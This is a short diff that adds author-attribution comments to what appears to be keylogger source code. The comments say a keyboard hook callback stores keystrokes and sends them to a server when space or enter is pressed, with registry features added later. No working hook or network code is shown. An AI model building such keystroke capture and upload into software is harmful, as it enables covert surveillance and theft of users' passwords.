@@ -41,6 +41,9 @@ std::string keystrokes;
  * FUNCTION: Callback
  * 
  * Written By: Keven McDowell and Robbie Cichon
+ * Robbie wrote the callback originally to send keystrokes to std::cout and 
+ * print them on the screen, and Keven just went through and changed it to store keystrokes
+ * in a variable and send them to the server whenever space or enter was hit.
  * 
  * PARAMETERS: 
  *      int keyboardcode:
@@ -147,6 +150,7 @@ void CreateHook()
  * 
  * Written By: Keven McDowell and Robbie Cichon
  * Robbie wrote all of this function outside of the message box and the registry stuff.
+ * I added those after the fact to try and beef up some of the features.
  * 
  * PARAMETERS: 
  *      HINSTANCE hinstance1
